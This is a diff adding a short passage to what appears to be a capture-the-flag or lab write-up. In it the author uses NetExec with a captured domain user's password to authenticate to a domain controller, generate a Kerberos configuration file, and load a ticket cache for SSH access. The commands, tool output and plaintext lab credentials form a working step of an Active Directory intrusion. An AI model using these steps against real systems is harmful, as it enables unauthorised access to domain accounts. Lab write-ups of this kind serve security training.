@@ -772,5 +772,17 @@ Now i have a TGT for the user!
 And before i can login to SSH i need to set `/etc/krb5.conf`
 
 ```python
+sudo nxc smb dc01.casper.hsm -u carlito -p 'casper88!' --smb-timeout 5 --generate-krb5-file /etc/krb5.conf
+[sudo] password for kali: 
+SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.31.82      445    DC01             [+] krb5 conf saved to: /etc/krb5.conf
+SMB         10.0.31.82      445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
+SMB         10.0.31.82      445    DC01             [+] casper.hsm\carlito:casper88!
+```
+
+Now the config is set
+
+```python
+export KRB5CCNAME=points.ccache
 
 ```
